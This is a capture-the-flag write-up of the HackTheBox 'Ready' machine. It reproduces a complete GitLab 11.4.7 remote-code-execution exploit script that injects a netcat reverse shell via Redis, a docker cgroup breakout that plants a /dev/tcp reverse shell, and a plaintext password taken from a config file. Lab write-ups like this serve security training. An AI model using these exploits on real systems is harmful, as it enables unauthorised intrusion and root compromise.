@@ -1,0 +1,217 @@
+---
+layout: post
+title:  "HackTheBox - Ready"
+date:   2021-08-11 01:58:25
+categories: Pentesting
+---
+
+# ENUMERATION
+
+```
+PORT     STATE SERVICE REASON  VERSION
+22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
+|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
+5080/tcp open  http    syn-ack nginx
+| http-robots.txt: 53 disallowed entries (40 shown)
+| / /autocomplete/users /search /api /admin /profile 
+| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
+| /s/ /snippets/new /snippets/*/edit /snippets/*/raw 
+| /*/*.git /*/*/fork/new /*/*/repository/archive* /*/*/activity 
+| /*/*/new /*/*/edit /*/*/raw /*/*/blame /*/*/commits/*/* 
+| /*/*/commit/*.patch /*/*/commit/*.diff /*/*/compare /*/*/branches/new 
+| /*/*/tags/new /*/*/network /*/*/graphs /*/*/milestones/new 
+| /*/*/milestones/*/edit /*/*/issues/new /*/*/issues/*/edit 
+| /*/*/merge_requests/new /*/*/merge_requests/*.patch 
+|_/*/*/merge_requests/*.diff /*/*/merge_requests/*/edit
+|_http-title: GitLab is not responding (502)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                               
+```
+On registering ourself as a new user in Gitlab ob port 5080 we see that it is running version 11.4.7 .
+
+# FOOTHOLD
+
+Searching for Gitlab version vulnerabilities we see these 2 exploits , tried 49257.py first but we dont have the authentication token so we try 49334.py and we get back a reverse shell.
+
+```s
+┌──(kali㉿MaskdMafia)-[~/Downloads]
+└─$ searchsploit gitlab 11.4.7
+---------------------------------------------------- ---------------------------------
+ Exploit Title                                      |  Path
+---------------------------------------------------- ---------------------------------
+GitLab 11.4.7 - RCE (Authenticated) (2)             | ruby/webapps/49334.py
+GitLab 11.4.7 - Remote Code Execution (Authenticate | ruby/webapps/49257.py
+---------------------------------------------------- ---------------------------------
+```
+This is the exploit script:
+```py
+# Exploit Title: GitLab 11.4.7 RCE (POC)
+# Date: 24th December 2020
+# Exploit Author: Norbert Hofmann
+# Exploit Modifications: Sam Redmond, Tam Lai Yin
+# Original Author: Mohin Paramasivam
+# Software Link: https://gitlab.com/
+# Environment: GitLab 11.4.7, community edition
+# CVE: CVE-2018-19571 + CVE-2018-19585
+
+#!/usr/bin/python3
+
+import requests
+from bs4 import BeautifulSoup
+import argparse
+import random
+
+
+parser = argparse.ArgumentParser(description='GitLab 11.4.7 RCE')
+parser.add_argument('-u', help='GitLab Username/Email', required=True)
+parser.add_argument('-p', help='Gitlab Password', required=True)
+parser.add_argument('-g', help='Gitlab URL (without port)', required=True)
+parser.add_argument('-l', help='reverse shell ip', required=True)
+parser.add_argument('-P', help='reverse shell port', required=True)
+args = parser.parse_args()
+
+username = args.u
+password = args.p
+gitlab_url = args.g + ":5080"
+local_ip = args.l
+local_port = args.P
+
+session = requests.Session()
+
+# Get Authentication Token
+r = session.get(gitlab_url + "/users/sign_in")
+soup = BeautifulSoup(r.text, features="lxml")
+token = soup.findAll('meta')[16].get("content")
+print(f"[+] authenticity_token: {token}")
+
+login_form = {
+    "authenticity_token": token,
+    "user[login]": username,
+    "user[password]": password,
+    "user[remember_me]": "0"
+}
+r = session.post(f"{gitlab_url}/users/sign_in", data=login_form)
+
+if r.status_code != 200:
+    exit(f"Login Failed:{r.text}")
+
+# Create project
+import_url = "git%3A%2F%2F%5B0%3A0%3A0%3A0%3A0%3Affff%3A127.0.0.1%5D%3A6379%2Ftest%2F.git"
+project_name = f'project{random.randrange(1, 10000)}'
+project_url = f'{gitlab_url}/{username}'
+
+print(f"[+] Creating project with random name: {project_name}")
+
+form = """\nmulti
+    sadd resque:gitlab:queues system_hook_push
+    lpush resque:gitlab:queue:system_hook_push "{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":[\\"class_eval\\",\\"open(\\'|""" + f'nc {local_ip} {local_port} -e /bin/bash' + """ \\').read\\"],\\"retry\\":3,\\"queue\\":\\"system_hook_push\\",\\"jid\\":\\"ad52abc5641173e217eb2e52\\",\\"created_at\\":1608799993.1234567,\\"enqueued_at\\":1608799993.1234567}"
+    exec
+    exec
+    exec\n"""
+
+r = session.get(f"{gitlab_url}/projects/new")
+soup = BeautifulSoup(r.text, features="lxml")
+
+namespace_id = soup.find(
+    'input', {'name': 'project[namespace_id]'}).get('value')
+
+project_token = soup.findAll('meta')[16].get("content")
+project_token = project_token.replace("==", "%3D%3D")
+project_token = project_token.replace("+", "%2B")
+
+payload = f"utf8=%E2%9C%93&authenticity_token={project_token}&project%5Bimport_url%5D={import_url}{form}&project%5Bci_cd_only%5D=false&project%5Bname%5D={project_name}&project%5Bnamespace_id%5D={namespace_id}&project%5Bpath%5D={project_name}&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0"
+
+cookies = {
+    'sidebar_collapsed': 'false',
+    'event_filter': 'all',
+    'hide_auto_devops_implicitly_enabled_banner_1': 'false',
+    '_gitlab_session': session.cookies['_gitlab_session'],
+}
+
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'Accept-Language': 'en-US,en;q=0.5',
+    'Accept-Encoding': 'gzip, deflate',
+    'Referer': f'{gitlab_url}/projects',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Content-Length': '398',
+    'Connection': 'close',
+    'Upgrade-Insecure-Requests': '1',
+}
+
+print("[+] Running Exploit")
+r = session.post(
+    gitlab_url+'/projects', data=payload, cookies=cookies, headers=headers, verify=False)
+if "The change you requested was rejected." in r.text:
+    exit('Exploit failed, check input params')
+
+print('[+] Exploit completed successfully!')
+```
+Time to stabilise the reverse shell using socat:
+```s
+┌──(kali㉿MaskdMafia)-[~/Downloads]
+└─$ nc -lnvp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.34] from (UNKNOWN) [10.10.10.220] 56954
+
+whoami
+git
+```
+We find the user flag in /home/dude/user.tct
+
+Runing linpeas we see that we are in a docker container and most of our commands don't work.Also we see some interesting files in linpeas. We get the root password for docker from one file called gitlab.rb in /opt/backups
+
+```s
+# gitlab_rails['initial_root_password'] = "password"
+# gitlab_rails['db_password'] = nil
+# gitlab_rails['redis_password'] = nil
+gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
+```
+
+# PRIVILEGE ESCALATION
+
+Trying to search for how to excape docker when commands like docker, sudo , etc are not running we see this link from [hacktricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout) book showing another way:
+
+```s
+Second PoC
+# On the host
+docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
+​
+# In the container
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+​
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+​
+#For a normal PoC =================
+echo '#!/bin/sh' > /cmd
+echo "ps aux > $host_path/output" >> /cmd
+chmod a+x /cmd
+#===================================
+#Reverse shell
+echo '#!/bin/bash' > /cmd
+echo "bash -i >& /dev/tcp/10.10.14.21/9000 0>&1" >> /cmd
+chmod a+x /cmd
+#===================================
+​
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+head /output
+```
+We do this exploit line by line manually and we see that we have got our reverse shell in our listener in another terminal:
+```s
+┌──(kali㉿MaskdMafia)-[~/Downloads]
+└─$ nc -lnvp 1337
+listening on [any] 1337 ...
+connect to [10.10.14.34] from (UNKNOWN) [10.10.10.220] 49136
+bash: cannot set terminal process group (-1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@ready:/# 
+```
+Head over to /root/root.txt for the root flag :)
